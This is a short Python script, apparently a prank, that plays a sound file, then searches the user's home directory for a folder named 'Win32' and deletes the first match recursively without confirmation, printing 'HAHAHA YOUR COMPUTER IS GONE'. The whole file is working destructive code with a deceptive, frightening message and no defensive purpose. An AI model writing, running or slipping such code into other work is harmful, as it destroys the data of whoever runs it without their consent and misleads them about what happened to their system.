import os
import shutil
import time
import platform

AUDIO_FILE = "scrabble.wav"
TARGET_FOLDER = "Win32"

# ---------------- AUDIO ----------------
def play_sound():
    try:
        import winsound
        winsound.PlaySound(AUDIO_FILE, winsound.SND_FILENAME)
        return
    except ImportError:
        pass

    # Linux / macOS fallback (quiet)
    for cmd in [
        f'ffplay -nodisp -autoexit "{AUDIO_FILE}"',
        f'aplay "{AUDIO_FILE}"',
        f'paplay "{AUDIO_FILE}"',
        f'afplay "{AUDIO_FILE}"'
    ]:
        if os.system(cmd + " >/dev/null 2>&1") == 0:
            break

play_sound()
time.sleep(1)

# ---------------- SEARCH ROOT ----------------
system = platform.system()

if system == "Windows":
    SEARCH_ROOTS = [
        os.path.expanduser("~"),     # User folder
    ]
elif system == "Linux":
    SEARCH_ROOTS = [
        os.path.expanduser("~"),     # Home directory
    ]
else:
    SEARCH_ROOTS = [os.path.expanduser("~")]

# ---------------- SEARCH & DELETE ----------------
found = False

for base in SEARCH_ROOTS:
    for root, dirs, files in os.walk(base):
        if TARGET_FOLDER in dirs:
            full_path = os.path.join(root, TARGET_FOLDER)
            shutil.rmtree(full_path)
            print("HAHAHA YOUR COMPUTER IS GONE")
            print(f"(Deleted: {full_path})")
            found = True
            break
    if found:
        break

if not found:
    print("Folder not found.")
